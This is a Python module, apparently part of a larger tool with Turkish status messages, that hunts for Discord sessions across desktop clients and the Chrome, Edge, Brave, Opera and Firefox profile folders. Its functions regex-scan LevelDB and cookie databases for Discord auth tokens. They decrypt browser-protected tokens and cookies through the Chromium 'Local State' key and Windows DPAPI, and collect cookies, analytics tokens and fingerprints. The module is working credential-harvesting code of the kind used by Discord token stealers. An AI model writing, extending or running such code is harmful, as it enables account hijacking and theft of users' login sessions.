from __future__ import annotations

import base64
import os
import re
import shutil
import sqlite3
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

from .processes import list_processes

TOKEN_RE = re.compile(
    rb"(mfa\.[A-Za-z0-9_-]{80,}|[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,})"
)
ENCRYPTED_TOKEN_RE = re.compile(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)")
ANALYTICS_RE = re.compile(rb"__analytics__[^A-Za-z0-9]{0,24}([A-Za-z0-9._-]{20,80})")
FP_RE = re.compile(
    rb'executable_fingerprint["\\\s:=]+["\']([A-Za-z0-9+/=_-]{16,128})["\']'
)
COOKIE_ORDER = (
    "__dcfduid",
    "__sdcfduid",
    "cf_clearance",
    "locale",
    "_cfuvid",
    "__cfruid",
)
COOKIE_HOSTS = {"discord.com", ".discord.com", "www.discord.com"}

PROCESS_NAMES = (
    "vesktop",
    "vencorddesktop",
    "vencord",
    "equibop",
    "webcord",
    "armcord",
    "legcord",
    "discordcanary",
    "discordptb",
    "discorddevelopment",
    "update.exe",
    "discord",
)

SKIP_CMDLINE = (
    "--type=",
    "tokengen",
    "token-gen",
    "local_proxy",
    "ky_gameplayer",
    "kodyazar",
    "KY-GamePlayer",
)


@dataclass(frozen=True)
class RunningClient:
    name: str
    pid: int
    cmd: str
    user_data: Path | None
    ipc: bool = False


@dataclass
class ClientAuth:
    client: str = ""
    pid: int | None = None
    user_data: str = ""
    token: str = ""
    cookie: str = ""
    analytics_token: str = ""
    fingerprint: str = ""
    user_id: str = ""
    notes: list[str] = field(default_factory=list)

    @property
    def ready(self) -> bool:
        return bool(self.token and self.cookie)


def _home() -> Path:
    return Path.home()


def _win() -> bool:
    return sys.platform == "win32"


def known_user_data_dirs() -> list[tuple[str, Path]]:
    home = _home()
    candidates: list[tuple[str, Path]] = []
    if sys.platform == "darwin":
        support = home / "Library" / "Application Support"
        candidates.extend(
            [
                ("vesktop", support / "vesktop" / "sessionData"),
                ("vesktop", support / "vesktop"),
                ("discord", support / "discord"),
                ("discord-canary", support / "discordcanary"),
                ("discord-ptb", support / "discordptb"),
                ("vencord", support / "VencordDesktop" / "sessionData"),
                ("equibop", support / "equibop" / "sessionData"),
                ("webcord", support / "WebCord"),
                ("legcord", support / "legcord"),
                ("armcord", support / "armcord"),
            ]
        )
    elif _win():
        appdata = Path(os.environ.get("APPDATA") or home / "AppData" / "Roaming")
        local = Path(os.environ.get("LOCALAPPDATA") or home / "AppData" / "Local")
        candidates.extend(
            [
                ("vesktop", appdata / "vesktop" / "sessionData"),
                ("vesktop", appdata / "vesktop"),
                ("vencord", appdata / "VencordDesktop" / "sessionData"),
                ("vencord", appdata / "Vencord"),
                ("equibop", appdata / "equibop" / "sessionData"),
                ("equibop", appdata / "equibop"),
                ("discord", appdata / "discord"),
                ("discord-canary", appdata / "discordcanary"),
                ("discord-ptb", appdata / "discordptb"),
                ("discord-development", appdata / "discorddevelopment"),
                ("discord", local / "discord"),
                ("discord", local / "Discord"),
                ("webcord", appdata / "WebCord"),
                ("legcord", appdata / "legcord"),
                ("armcord", appdata / "armcord"),
            ]
        )
    else:
        xdg = Path(os.environ.get("XDG_CONFIG_HOME") or home / ".config")
        candidates.extend(
            [
                ("vesktop", xdg / "vesktop" / "sessionData"),
                ("vesktop", xdg / "vesktop"),
                ("vencord", xdg / "Vencord"),
                ("equibop", xdg / "equibop" / "sessionData"),
                ("equibop", xdg / "equibop"),
                ("discord", xdg / "discord"),
                ("discord-canary", xdg / "discordcanary"),
                ("discord-ptb", xdg / "discordptb"),
                ("webcord", xdg / "WebCord"),
                ("armcord", xdg / "armcord"),
                ("legcord", xdg / "legcord"),
                ("vesktop-flatpak", home / ".var/app/dev.vencord.Vesktop/config/vesktop/sessionData"),
                ("discord-flatpak", home / ".var/app/com.discordapp.Discord/config/discord"),
                ("discord-snap", home / "snap/discord/current/.config/discord"),
            ]
        )
    out: list[tuple[str, Path]] = []
    seen: set[Path] = set()
    for name, path in candidates:
        resolved = path.expanduser()
        if resolved in seen or not resolved.exists():
            continue
        seen.add(resolved)
        out.append((name, resolved))
    return out


def _chromium_user_data_bases() -> list[tuple[str, Path]]:
    home = _home()
    if _win():
        local = Path(os.environ.get("LOCALAPPDATA") or home / "AppData" / "Local")
        roaming = Path(os.environ.get("APPDATA") or home / "AppData" / "Roaming")
        return [
            ("chrome", local / "Google" / "Chrome" / "User Data"),
            ("chrome-beta", local / "Google" / "Chrome Beta" / "User Data"),
            ("chrome-canary", local / "Google" / "Chrome SxS" / "User Data"),
            ("brave", local / "BraveSoftware" / "Brave-Browser" / "User Data"),
            ("edge", local / "Microsoft" / "Edge" / "User Data"),
            ("chromium", local / "Chromium" / "User Data"),
            ("vivaldi", local / "Vivaldi" / "User Data"),
            ("opera", roaming / "Opera Software" / "Opera Stable"),
            ("opera-gx", roaming / "Opera Software" / "Opera GX Stable"),
        ]
    if sys.platform == "darwin":
        support = home / "Library" / "Application Support"
        return [
            ("chrome", support / "Google" / "Chrome"),
            ("chrome-canary", support / "Google" / "Chrome Canary"),
            ("brave", support / "BraveSoftware" / "Brave-Browser"),
            ("edge", support / "Microsoft Edge"),
            ("chromium", support / "Chromium"),
            ("vivaldi", support / "Vivaldi"),
            ("opera", support / "com.operasoftware.Opera"),
        ]
    xdg = Path(os.environ.get("XDG_CONFIG_HOME") or home / ".config")
    return [
        ("chrome", xdg / "google-chrome"),
        ("chrome-beta", xdg / "google-chrome-beta"),
        ("brave", xdg / "BraveSoftware" / "Brave-Browser"),
        ("edge", xdg / "microsoft-edge"),
        ("chromium", xdg / "chromium"),
        ("vivaldi", xdg / "vivaldi"),
        ("opera", xdg / "opera"),
    ]


def _firefox_profile_bases() -> list[Path]:
    home = _home()
    if _win():
        roaming = Path(os.environ.get("APPDATA") or home / "AppData" / "Roaming")
        return [roaming / "Mozilla" / "Firefox" / "Profiles"]
    if sys.platform == "darwin":
        return [home / "Library" / "Application Support" / "Firefox" / "Profiles"]
    return [
        home / ".mozilla" / "firefox",
        Path(os.environ.get("XDG_CONFIG_HOME") or home / ".config") / "firefox",
    ]


def known_browser_dirs() -> list[tuple[str, Path]]:
    out: list[tuple[str, Path]] = []
    seen: set[Path] = set()
    profiles = ("Default", "Default Profile", "Profile 1", "Profile 2", "Profile 3", "Guest Profile")
    for name, base in _chromium_user_data_bases():
        if not base.exists():
            continue
        if base not in seen:
            seen.add(base)
            out.append((name, base))
        for folder in profiles:
            path = base / folder
            if path.is_dir() and path not in seen:
                seen.add(path)
                out.append((f"{name}-{folder}", path))
        try:
            extras = [p for p in base.iterdir() if p.is_dir() and p.name.startswith("Profile ")]
        except OSError:
            extras = []
        for path in extras[:4]:
            if path not in seen:
                seen.add(path)
                out.append((f"{name}-{path.name}", path))
    for root in _firefox_profile_bases():
        if not root.is_dir():
            continue
        try:
            children = [p for p in root.iterdir() if p.is_dir()]
        except OSError:
            children = []
        for path in children[:6]:
            if (path / "cookies.sqlite").exists() or (path / "webappsstore.sqlite").exists():
                if path not in seen:
                    seen.add(path)
                    out.append((f"firefox-{path.name[:24]}", path))
    return out


def _user_data_from_cmd(cmd: str) -> Path | None:
    marker = "--user-data-dir="
    if marker not in cmd:
        return None
    rest = cmd.split(marker, 1)[1]
    value = rest.split(" --", 1)[0].strip().strip('"')
    path = Path(value)
    session = path / "sessionData"
    if session.exists():
        return session
    return path if path.exists() else None


def _classify(blob: str) -> str | None:
    low = blob.casefold()
    if any(skip in low for skip in SKIP_CMDLINE):
        return None
    for name in PROCESS_NAMES:
        if name in low:
            if name == "discord" and "discord-token" in low:
                return None
            return "vencord" if name == "vencorddesktop" else name
    return None


def _pid_has_ipc(pid: int) -> bool:
    if _win():
        return False
    fd_dir = Path(f"/proc/{pid}/fd")
    try:
        names = list(fd_dir.iterdir())
    except OSError:
        return False
    for entry in names:
        try:
            target = os.readlink(str(entry))
        except OSError:
            continue
        if "discord-ipc" in target:
            return True
    return False


def _clients_from_processes() -> list[RunningClient]:
    found: list[RunningClient] = []
    seen: set[int] = set()
    ipc_live = False
    try:
        from .ipc import find_discord_ipc

        ipc_live = find_discord_ipc() is not None
    except Exception:
        ipc_live = False
    for proc in list_processes():
        blob = " ".join(part for part in (proc.name, proc.exe, proc.cmdline) if part)
        name = _classify(blob)
        if name is None or proc.pid in seen:
            continue
        seen.add(proc.pid)
        cmd = proc.cmdline or proc.exe or proc.name
        found.append(
            RunningClient(
                name=name,
                pid=proc.pid,
                cmd=cmd,
                user_data=_user_data_from_cmd(cmd),
                ipc=_pid_has_ipc(proc.pid) or ipc_live,
            )
        )
    return found


def list_running_clients() -> list[RunningClient]:
    try:
        found = _clients_from_processes()
    except Exception:
        return []
    rank = {"discord": 0, "vesktop": 1, "vencord": 2, "equibop": 3}
    found.sort(key=lambda item: (not item.ipc, rank.get(item.name, 9), item.pid))
    return found


def _leveldb_dirs(root: Path) -> list[Path]:
    hits: list[Path] = []
    names = (
        "Local Storage/leveldb",
        "sessionData/Local Storage/leveldb",
        "Default/Local Storage/leveldb",
        "sessionData/Default/Local Storage/leveldb",
        "Local Storage/leveldb",
        "Network",
    )
    for rel in names:
        path = root / rel
        if path.name == "leveldb" and path.is_dir() and path not in hits:
            hits.append(path)
        ldb = path / "leveldb" if path.is_dir() else None
        if ldb is not None and ldb.is_dir() and ldb not in hits:
            hits.append(ldb)
    try:
        for child in root.iterdir():
            if not child.is_dir():
                continue
            for rel in ("Local Storage/leveldb", "leveldb"):
                path = child / rel
                if path.is_dir() and path not in hits:
                    hits.append(path)
    except OSError:
        pass
    return hits


def _cookie_dbs(root: Path) -> list[Path]:
    hits: list[Path] = []
    for rel in (
        "Cookies",
        "Network/Cookies",
        "sessionData/Cookies",
        "sessionData/Network/Cookies",
        "Default/Network/Cookies",
        "Default/Cookies",
        "sessionData/Default/Network/Cookies",
    ):
        path = root / rel
        if path.exists():
            hits.append(path)
    return hits


def _decode_user_id(token: str) -> str:
    part = token.split(".", 1)[0]
    pad = "=" * ((4 - len(part) % 4) % 4)
    try:
        raw = base64.b64decode(part + pad)
        text = raw.decode("utf-8", "ignore")
    except Exception:
        return ""
    return text if text.isdigit() and 16 <= len(text) <= 22 else ""


def _token_score(token: str, context: bytes, mtime: float) -> float:
    score = mtime
    low = context.lower()
    if b"token" in low or b"oken" in low:
        score += 1e12
    if token.startswith("mfa."):
        score += 1e11
    if _decode_user_id(token):
        score += 1e10
    return score


def _leveldb_files(folder: Path) -> list[Path]:
    files: list[Path] = []
    try:
        for path in folder.iterdir():
            if not path.is_file():
                continue
            if path.name in {"LOCK", "LOG", "CURRENT"} or path.name.startswith("MANIFEST"):
                continue
            if path.suffix.lower() in {".log", ".ldb", ".sst", ""} or path.name.endswith(".log"):
                files.append(path)
    except OSError:
        return []
    files.sort(key=lambda path: path.stat().st_mtime if path.exists() else 0, reverse=True)
    return files


def _looks_like_token(text: str) -> bool:
    text = text.strip().strip("\x00").strip('"')
    if text.startswith("mfa.") and len(text) > 80:
        return True
    if _decode_user_id(text):
        return True
    return False


def _aes_gcm(aes_key: bytes | None, raw: bytes) -> str:
    if not aes_key or len(raw) < 28:
        return ""
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except Exception:
        return ""
    if raw.startswith(b"v10") or raw.startswith(b"v11"):
        nonce, data = raw[3:15], raw[15:]
    else:
        nonce, data = raw[:12], raw[12:]
    try:
        plain = AESGCM(aes_key).decrypt(nonce, data, None)
        return plain.decode("utf-8", "ignore").strip().strip("\x00").strip('"')
    except Exception:
        return ""


def _decrypt_safe_storage(blob_b64: str, aes_key: bytes | None) -> str:
    if not blob_b64:
        return ""
    try:
        raw = base64.b64decode(blob_b64)
    except Exception:
        return ""
    text = _aes_gcm(aes_key, raw)
    if _looks_like_token(text):
        return text
    unprotected = _dpapi_unprotect(raw)
    if unprotected:
        if _looks_like_token(unprotected.decode("utf-8", "ignore")):
            return unprotected.decode("utf-8", "ignore").strip().strip("\x00").strip('"')
        text = _aes_gcm(aes_key, unprotected)
        if _looks_like_token(text):
            return text
    return ""


def harvest_token(root: Path) -> tuple[str, str]:
    from .winutil import read_shared

    best = ("", 0.0)
    analytics = ""
    aes_key = _chrome_key(root)
    for ldb in _leveldb_dirs(root):
        for path in _leveldb_files(ldb):
            data = read_shared(path)
            if not data:
                continue
            try:
                mtime = path.stat().st_mtime
            except OSError:
                mtime = 0.0
            if not analytics:
                match = ANALYTICS_RE.search(data)
                if match:
                    analytics = match.group(1).decode("ascii", "ignore")
            for match in ENCRYPTED_TOKEN_RE.finditer(data):
                blob = match.group(1).decode("ascii", "ignore")
                token = _decrypt_safe_storage(blob, aes_key)
                if not token:
                    continue
                if not _decode_user_id(token) and not token.startswith("mfa."):
                    continue
                ctx = data[max(0, match.start() - 48) : match.start()]
                score = _token_score(token, ctx, mtime) + 1e13
                if score > best[1]:
                    best = (token, score)
            for match in TOKEN_RE.finditer(data):
                token = match.group(1).decode("ascii", "ignore")
                if not _decode_user_id(token) and not token.startswith("mfa."):
                    continue
                ctx = data[max(0, match.start() - 48) : match.start()]
                score = _token_score(token, ctx, mtime)
                if score > best[1]:
                    best = (token, score)
    return best[0], analytics


def _dpapi_unprotect(blob: bytes) -> bytes | None:
    from .winutil import dpapi_unprotect

    return dpapi_unprotect(blob)


def _chrome_key(root: Path) -> bytes | None:
    candidates = [
        root / "Local State",
        root / "sessionData" / "Local State",
        root.parent / "Local State",
    ]
    try:
        for child in root.iterdir():
            if child.is_dir():
                candidates.append(child / "Local State")
    except OSError:
        pass
    seen: set[Path] = set()
    for candidate in candidates:
        if candidate in seen or not candidate.is_file():
            continue
        seen.add(candidate)
        try:
            import json

            payload = json.loads(candidate.read_text(encoding="utf-8"))
            key_b64 = (payload.get("os_crypt") or {}).get("encrypted_key") or ""
            raw = base64.b64decode(key_b64)
            if raw.startswith(b"DPAPI"):
                raw = raw[5:]
            key = _dpapi_unprotect(raw)
            if key:
                return key
        except Exception:
            continue
    return None


def _decrypt_cookie_value(value: str, encrypted: bytes, aes_key: bytes | None) -> str:
    if value:
        return value
    if not encrypted:
        return ""
    if encrypted.startswith(b"v10") or encrypted.startswith(b"v11"):
        if not aes_key:
            return ""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM

            aes = AESGCM(aes_key)
            plain = aes.decrypt(encrypted[3:15], encrypted[15:], None)
            return plain.decode("utf-8", "ignore")
        except ImportError:
            return ""
        except Exception:
            return ""
    if encrypted[:3] in {b"v20", b"v21"} or encrypted.startswith(b"APPB"):
        return ""
    unprotected = _dpapi_unprotect(encrypted)
    if unprotected:
        return unprotected.decode("utf-8", "ignore")
    return ""


def _open_sqlite(path: Path) -> sqlite3.Connection | None:
    uri = f"file:{path}?mode=ro"
    try:
        return sqlite3.connect(uri, uri=True, timeout=1)
    except sqlite3.Error:
        pass
    tmp_dir = Path(tempfile.mkdtemp(prefix="ky-cookies-"))
    tmp = tmp_dir / "Cookies"
    try:
        from .winutil import copy_shared

        if not copy_shared(path, tmp):
            shutil.copy2(path, tmp)
        for suffix in ("-journal", "-wal"):
            extra = Path(str(path) + suffix)
            if extra.exists():
                copy_shared(extra, tmp_dir / f"Cookies{suffix}")
        return sqlite3.connect(f"file:{tmp}?mode=ro", uri=True, timeout=1)
    except (OSError, sqlite3.Error):
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return None


def harvest_cookie(root: Path) -> str:
    aes_key = _chrome_key(root) if _win() else None
    for db in _cookie_dbs(root):
        con = _open_sqlite(db)
        if con is None:
            continue
        try:
            rows = list(
                con.execute(
                    "select host_key, name, value, encrypted_value from cookies "
                    "where name in (?,?,?,?,?,?)",
                    COOKIE_ORDER,
                )
            )
        except sqlite3.Error:
            try:
                rows = [
                    (h, n, v, b"")
                    for h, n, v in con.execute(
                        "select host_key, name, value from cookies where name in (?,?,?,?,?,?)",
                        COOKIE_ORDER,
                    )
                ]
            except sqlite3.Error:
                rows = []
        finally:
            con.close()
        picked: dict[str, str] = {}
        for host, name, value, encrypted in rows:
            host_s = str(host or "").lstrip(".").casefold()
            if not host_s.endswith("discord.com") or name in picked:
                continue
            blob = encrypted if isinstance(encrypted, (bytes, memoryview)) else b""
            blob_b = bytes(blob)
            if blob_b[:3] in {b"v20", b"v21"} or blob_b.startswith(b"APPB"):
                continue
            text = _decrypt_cookie_value(str(value or ""), blob_b, aes_key)
            if text:
                picked[str(name)] = text
        if "__dcfduid" in picked or "__sdcfduid" in picked:
            parts = [f"{name}={picked[name]}" for name in COOKIE_ORDER if name in picked]
            if "locale" not in picked:
                from .httputil import local_locale

                parts.append(f"locale={local_locale()}")
            return "; ".join(parts)
    return harvest_firefox_cookie(root)


def harvest_firefox_cookie(root: Path) -> str:
    db = root / "cookies.sqlite"
    if not db.exists():
        return ""
    con = _open_sqlite(db)
    if con is None:
        return ""
    try:
        try:
            rows = list(
                con.execute(
                    "select host, name, value from moz_cookies "
                    "where host like '%discord.com%' and name in (?,?,?,?,?,?)",
                    COOKIE_ORDER,
                )
            )
        except sqlite3.Error:
            rows = []
    finally:
        con.close()
    picked: dict[str, str] = {}
    for host, name, value in rows:
        host_s = str(host or "").lstrip(".").casefold()
        if not host_s.endswith("discord.com") or name in picked:
            continue
        if value:
            picked[str(name)] = str(value)
    if "__dcfduid" in picked or "__sdcfduid" in picked:
        from .httputil import local_locale

        parts = [f"{name}={picked[name]}" for name in COOKIE_ORDER if name in picked]
        if "locale" not in picked:
            parts.append(f"locale={local_locale()}")
        return "; ".join(parts)
    return ""


def harvest_firefox_token(root: Path) -> tuple[str, str]:
    from .winutil import read_shared

    files: list[Path] = []
    for rel in (
        "webappsstore.sqlite",
        "storage/default",
    ):
        path = root / rel
        if path.is_file():
            files.append(path)
        elif path.is_dir():
            try:
                for child in path.rglob("*"):
                    if child.is_file() and child.suffix.lower() in {".sqlite", ".sqlite-wal"}:
                        if "discord" in str(child).casefold() or child.name.startswith("data"):
                            files.append(child)
            except OSError:
                pass
    best = ""
    analytics = ""
    for path in files[:30]:
        data = read_shared(path, limit=8_000_000)
        if not data:
            continue
        if not analytics:
            match = ANALYTICS_RE.search(data)
            if match:
                analytics = match.group(1).decode("ascii", "ignore")
        for match in TOKEN_RE.finditer(data):
            token = match.group(1).decode("ascii", "ignore")
            if _looks_like_token(token):
                return token, analytics
        con = _open_sqlite(path) if path.suffix.lower().startswith(".sqlite") else None
        if con is None:
            continue
        try:
            tables = [r[0] for r in con.execute("select name from sqlite_master where type='table'")]
            for table in tables:
                try:
                    safe = table.replace('"', "")
                    rows = con.execute(f'select * from "{safe}" limit 400')
                except sqlite3.Error:
                    continue
                for row in rows:
                    blob = " ".join(str(col) for col in row if col is not None).encode("utf-8", "ignore")
                    match = TOKEN_RE.search(blob)
                    if match:
                        token = match.group(1).decode("ascii", "ignore")
                        if _looks_like_token(token):
                            best = token
                            break
                if best:
                    break
        finally:
            con.close()
        if best:
            break
    return best, analytics


def harvest_fingerprint(root: Path) -> str:
    roots = [root]
    session = root / "sessionData"
    if session.exists():
        roots.append(session)
    for base in roots:
        for rel in (
            "Local Storage/leveldb",
            "IndexedDB",
            "Session Storage",
            "Cache/Cache_Data",
        ):
            folder = base / rel
            if not folder.exists():
                continue
            files = [p for p in folder.iterdir() if p.is_file()] if folder.is_dir() else []
            files.sort(key=lambda p: p.stat().st_mtime if p.exists() else 0, reverse=True)
            for path in files[:40]:
                try:
                    size = path.stat().st_size
                except OSError:
                    continue
                if size > 2_000_000:
                    continue
                try:
                    data = path.read_bytes()
                except OSError:
                    continue
                match = FP_RE.search(data)
                if match:
                    return match.group(1).decode("ascii", "ignore")
    return ""


def _roots_for_client(client: RunningClient | None) -> list[tuple[str, Path]]:
    ordered: list[tuple[str, Path]] = []
    seen: set[Path] = set()
    if client and client.user_data and client.user_data.exists():
        ordered.append((client.name, client.user_data))
        seen.add(client.user_data)
    if client:
        for name, path in known_user_data_dirs():
            if name.startswith(client.name.split("-")[0]) and path not in seen:
                ordered.append((name, path))
                seen.add(path)
    for name, path in known_user_data_dirs():
        if path not in seen:
            ordered.append((name, path))
            seen.add(path)
    for name, path in known_browser_dirs():
        if path not in seen:
            ordered.append((name, path))
            seen.add(path)
    return ordered


def harvest_disk_extras(auth: ClientAuth) -> ClientAuth:
    if auth.cookie and auth.fingerprint:
        return auth
    for name, root in list(known_user_data_dirs()) + list(known_browser_dirs()):
        if not auth.cookie:
            cookie = harvest_firefox_cookie(root) if name.startswith("firefox") else harvest_cookie(root)
            if cookie:
                auth.cookie = cookie
                auth.notes.append(f"cookie {name}")
        if not auth.fingerprint:
            fingerprint = harvest_fingerprint(root)
            if fingerprint:
                auth.fingerprint = fingerprint
                auth.notes.append("fingerprint diskte")
        if auth.cookie and auth.fingerprint:
            break
    if auth.token and not auth.cookie:
        auth.notes.append("cookie çözülemedi (kilitli db / App-Bound v20 / cryptography)")
    return auth


def harvest(preferred: RunningClient | None = None, *, quick: bool = False) -> ClientAuth:
    running = list_running_clients()
    client = preferred
    if client is None:
        ipc_clients = [item for item in running if item.ipc]
        client = ipc_clients[0] if ipc_clients else (running[0] if running else None)
    auth = ClientAuth(
        client=client.name if client else "",
        pid=client.pid if client else None,
        user_data=str(client.user_data) if client and client.user_data else "",
    )
    if client:
        auth.notes.append(f"süreç {client.name} pid={client.pid}")
    else:
        auth.notes.append("açık discord süreci yok, disk taranıyor")
    for name, root in _roots_for_client(client):
        if name.startswith("firefox"):
            token, analytics = harvest_firefox_token(root)
            cookie = harvest_firefox_cookie(root)
            fingerprint = ""
        else:
            token, analytics = harvest_token(root)
            cookie = "" if quick and token else harvest_cookie(root)
            fingerprint = "" if quick else harvest_fingerprint(root)
        if token or cookie:
            auth.client = auth.client or name
            auth.user_data = auth.user_data or str(root)
            if token and not auth.token:
                auth.token = token
                auth.user_id = _decode_user_id(token)
                auth.notes.append(f"token {name}")
            if analytics and not auth.analytics_token:
                auth.analytics_token = analytics
            if cookie and not auth.cookie:
                auth.cookie = cookie
                auth.notes.append(f"cookie {name}")
            if fingerprint and not auth.fingerprint:
                auth.fingerprint = fingerprint
                auth.notes.append("fingerprint diskte")
        if auth.token and (quick or auth.cookie):
            break
        if auth.token and not auth.cookie:
            continue
    if not quick and not auth.fingerprint:
        auth.notes.append("fp client saklamıyor")
    if auth.token and not auth.cookie:
        auth.notes.append("cookie çözülemedi (kilitli db / App-Bound v20 / cryptography)")
    return auth
